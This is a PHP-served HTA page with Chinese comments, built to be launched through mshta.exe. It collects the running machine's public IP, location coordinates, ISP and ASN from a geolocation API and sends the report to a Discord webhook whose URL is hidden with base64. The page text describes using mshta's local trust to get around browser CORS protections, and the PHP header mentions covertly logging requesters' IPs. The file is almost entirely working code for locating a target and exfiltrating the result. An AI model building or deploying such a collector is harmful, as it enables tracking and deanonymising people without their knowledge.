<?php
// 1. 強制指定瀏覽器/mshta 以 HTML 格式解析，並指定 UTF-8 編碼防止中文字亂碼
header('Content-Type: text/html; charset=utf-8');

// 2. 這裡可以放置後端邏輯（例如：偷偷記錄是哪一個 IP 來請求這個惡意/測試腳本的）
$client_ip = $_SERVER['REMOTE_ADDR'];
// file_put_contents("request_log.txt", date("Y-m-d H:i:s") . " - " . $client_ip . "\n", FILE_APPEND);
?>
<!DOCTYPE html>
<html>
<head>
    <title>終端公網 IP 資訊收集器 (遠端 PHP 版)</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta charset="UTF-8">

    <hta:application 
        id="myApp"
        applicationname="IpWebhookCollector"
        border="thick"
        caption="yes"
        showintaskbar="yes"
        singleinstance="yes"
        sysmenu="yes"
        windowstate="normal"
        scroll="yes"
    />

    <style>
        body {
            font-family: "Microsoft JhengHei", Arial, sans-serif;
            background-color: #f4f6f9;
            color: #333;
            padding: 20px;
            margin: 0;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
        }
        h2 { color: #2c3e50; text-align: center; margin-top: 0; }
        .btn {
            display: block;
            width: 100%;
            padding: 12px;
            background: #e67e22; /* 稍微改個顏色區分這是 PHP 版本 */
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            font-weight: bold;
        }
        .btn:hover { background: #d35400; }
        #result {
            margin-top: 20px;
            padding: 15px;
            background: #2c3e50;
            color: #ecf0f1;
            border-left: 5px solid #e74c3c;
            white-space: pre-wrap;
            font-family: Consolas, monospace;
            font-size: 14px;
            border-radius: 4px;
            min-height: 100px;
        }
        .status {
            text-align: center;
            font-weight: bold;
            color: #e74c3c;
            margin-top: 15px;
            font-size: 15px;
        }
    </style>

    <script language="JavaScript">
        // 視窗啟動時自動調整成適合的尺寸
        window.resizeTo(580, 650);

        // ⚠️ 請在這裡貼上你的 Discord Webhook 網址
        var webhookUrl = "<?php echo base64_decode('YOUR_BASE64_ENCODED_WEBHOOK'); ?>";

        function startCollection() {
            var resultDiv = document.getElementById("result");
            var statusDiv = document.getElementById("status");
            resultDiv.innerHTML = "正在向電信商機房撈取公網資訊中...";
            statusDiv.innerHTML = "";

            // 延遲一小段時間讓畫面更新文字，避免 ActiveX 造成的同步卡頓
            setTimeout(function() {
                fetchIpData();
            }, 100);
        }

        function fetchIpData() {
            var resultDiv = document.getElementById("result");
            try {
                // 使用 HTA 內建不受 CORS 限制的 HTTP 元件 (在地端權限下執行)
                var xhr = new ActiveXObject("MSXML2.ServerXMLHTTP");
                
                // 呼叫公開地理位置 API，並指定繁體中文
                xhr.open("GET", "http://ip-api.com/json/?lang=zh-TW", false);
                xhr.send();

                if (xhr.status === 200) {
                    var responseText = xhr.responseText;
                    
                    // 1. 將撈到的 JSON 解析並排版呈現於畫面上
                    var formattedText = parseAndFormatJson(responseText);
                    resultDiv.innerHTML = formattedText;
                    
                    // 2. 自動發送至 Discord
                    sendToDiscord(formattedText);
                } else {
                    resultDiv.innerHTML = "【錯誤】無法連線到 IP 伺服器，狀態碼: " + xhr.status;
                }
            } catch (e) {
                resultDiv.innerHTML = "【撈取失敗】系統異常，原因: " + e.message;
            }
        }

        function parseAndFormatJson(jsonStr) {
            try {
                // 在 HTA (IE核心) 中，最穩健解析 JSON 的方式是 eval
                var obj = eval('(' + jsonStr + ')');
                
                if(obj.status !== "success") {
                    return "API 回傳錯誤，無法撈取詳細資料。";
                }

                // 組合詳細報表
                var info = "========= 終端詳細報告 (PHP-MSHTA) =========\n";
                info += "實體公網 IP : " + obj.query + "\n";
                info += "所在國家    : " + obj.country + " (" + obj.countryCode + ")\n";
                info += "城市區域    : " + obj.regionName + " / " + obj.city + "\n";
                info += "郵遞區號    : " + obj.zip + "\n";
                info += "經緯度座標  : " + obj.lat + ", " + obj.lon + "\n";
                info += "網際網路 ISP: " + obj.isp + "\n";
                info += "自治系統 ASN: " + obj.as + "\n";
                info += "系統時區    : " + obj.timezone + "\n";
                info += "=========================================";
                return info;
            } catch (e) {
                return "解析 JSON 失敗: " + e.message + "\n原始資料:\n" + jsonStr;
            }
        }

        function sendToDiscord(reportText) {
            var statusDiv = document.getElementById("status");
            
            if (!webhookUrl || webhookUrl.indexOf("http") !== 0 || webhookUrl.indexOf("YOUR_") === 0) {
                statusDiv.style.color = "#e67e22";
                statusDiv.innerHTML = "⚠️ 畫面上已成功撈取！但未偵測到有效的 Discord Webhook 網址，已跳過發送。";
                return;
            }

            try {
                var xhr = new ActiveXObject("MSXML2.ServerXMLHTTP");
                xhr.open("POST", webhookUrl, false);
                xhr.setRequestHeader("Content-Type", "application/json");
                
                // 將文字排版成 Discord 程式碼區塊格式
                var discordContent = "```\n" + reportText + "\n```";
                
                // 手動組合符合 Discord 規範的 JSON Payload
                var payload = '{"content": "' + discordContent.replace(/\n/g, '\\n') + '"}';
                
                xhr.send(payload);

                if (xhr.status === 200 || xhr.status === 204) {
                    statusDiv.style.color = "#27ae60";
                    statusDiv.innerHTML = "🚀 【回傳成功】詳細資料已同步發射至 Discord 頻道！";
                } else {
                    statusDiv.innerHTML = "❌ Discord 拒絕接收，狀態碼: " + xhr.status;
                }
            } catch (e) {
                statusDiv.innerHTML = "❌ Webhook 連線發生異常: " + e.message;
            }
        }
    </script>
</head>
<body>

<div class="container">
    <h2>終端資訊收集器 (遠端 PHP 版)</h2>
    <p style="text-align:left; color:#7f8c8d; font-size: 14px; line-height: 1.5;">
        此腳本目前託管於 Web 伺服器，透過 <code>mshta.exe</code> 載入後，會在地端獲取高階信任權限，直接繞過瀏覽器同源政策（CORS）阻擋。
    </p>
    
    <button class="btn" onclick="startCollection()">一鍵撈取並同步 Webhook</button>
    
    <div id="status" class="status"></div>
    <div id="result">尚未獲取資料。點擊上方按鈕開始。</div>
</div>

</body>
</html>